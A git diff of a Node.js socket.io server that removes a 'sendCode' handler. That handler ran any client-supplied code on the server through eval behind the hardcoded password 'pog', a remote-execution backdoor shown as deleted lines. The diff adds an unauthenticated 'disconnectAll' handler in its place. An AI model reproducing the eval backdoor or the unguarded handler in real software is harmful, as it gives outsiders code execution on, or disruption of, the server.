@@ -12,6 +12,7 @@ const io = require("socket.io")(server);
 const fs = require('fs');
 const jsObfuscate = require('javascript-obfuscator');
 const grawlix = require('grawlix');
+const fetchUrl = require("fetch").fetchUrl;
 
 const encryptFile = require(`${__dirname}/modules/encryptJSDirectory.js`);
 
@@ -34,6 +35,7 @@ const port = 3000;
 global.app = app
 global.grawlix = grawlix;
 global.socket = require("socket.io")();
+global.fetchUrl = fetchUrl;
 global.rootDir = __dirname;
 global.fs = fs;
 global.jsObfuscate = jsObfuscate;
@@ -68,22 +70,8 @@ io.on('connection', (socket) => {
     // monkey
   })
 
-  socket.on("sendCode", (data) => {
-    var parsedData = JSON.parse(data)
-
-    if (!parsedData) return
-    if (!parsedData.password) return
-    if (parsedData.password == "pog") {
-      if (parsedData.code) {
-        if (!parsedData.method) io.emit("server",parsedData.code)
-        
-        if (parsedData.method == "server") {
-          eval(parsedData.code)
-        } else {
-          io.emit("server",parsedData.code)
-        }
-      };
-    };
+  socket.on("disconnectAll", (data) => {
+    io.emit("disconnect")
   })
 });
 
